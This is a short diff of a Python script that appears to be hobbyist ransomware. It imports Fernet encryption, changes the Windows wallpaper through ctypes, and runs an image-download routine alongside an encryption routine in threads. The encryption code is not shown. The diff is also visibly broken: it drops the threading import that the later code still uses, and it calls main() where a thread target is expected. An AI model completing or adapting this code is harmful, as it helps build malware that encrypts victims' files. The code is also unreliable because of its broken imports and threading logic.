@@ -1,7 +1,7 @@
 #Mi magna opera magistralis.
 
 from cryptography.fernet import Fernet
-import os , ctypes , requests , threading , platform
+import os , ctypes , requests 
 
 def set_wallpaper(img):
     ctypes.windll.user32.SystemParametersInfoW(20 , 0 , img , 0)
@@ -136,7 +136,7 @@ if __name__ == "__main__":
     Proceso1 = threading.Thread(target= main())
     Proceso2 = threading.Thread(target= download_and_multiply_img())
     
-    Ejecuta el crear fotos y encriptar a la vez
+    #Ejecuta el crear fotos y encriptar a la vez
     
     Proceso1.start() 
     Proceso2.start()
